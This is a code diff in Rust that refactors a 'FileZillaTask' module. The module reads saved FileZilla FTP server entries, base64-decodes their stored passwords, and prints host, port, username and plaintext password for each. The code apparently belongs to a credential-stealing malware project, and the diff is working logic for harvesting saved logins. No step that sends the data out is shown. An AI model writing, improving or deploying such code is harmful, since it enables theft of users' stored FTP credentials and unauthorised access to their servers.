@@ -1,4 +1,4 @@
-use alloc::string::String;
+use alloc::string::{String, ToString};
 use alloc::vec::Vec;
 use alloc::format;
 use tasks::Task;
@@ -26,13 +26,20 @@ impl Task for FileZillaTask {
         }
         
         let servers = deduped.iter().map(|server| {
-            let password = base64_decode(server.password.as_bytes()).map(|decoded| String::from_utf8_lossy_owned(decoded));
+            let password_decoded = base64_decode(server.password.as_bytes())
+                .map(|decoded| String::from_utf8_lossy(&decoded).to_string());
+
+            let password_str = match password_decoded {
+                Some(ref s) => s.as_str(),
+                None => &server.password,
+            };
+
             format!(
-                "\
-                Url: ftp://{}:{}/\n\
-                Username: {}\n\
-                Password: {}",
-                server.host, server.port, server.user, if (password.is_none()) { &server.password } else { password.unwrap() }
+                "Url: ftp://{}:{}/\nUsername: {}\nPassword: {}",
+                server.host,
+                server.port,
+                server.user,
+                password_str
             )
         }).collect::<Vec<_>>().join("\n\n");
         
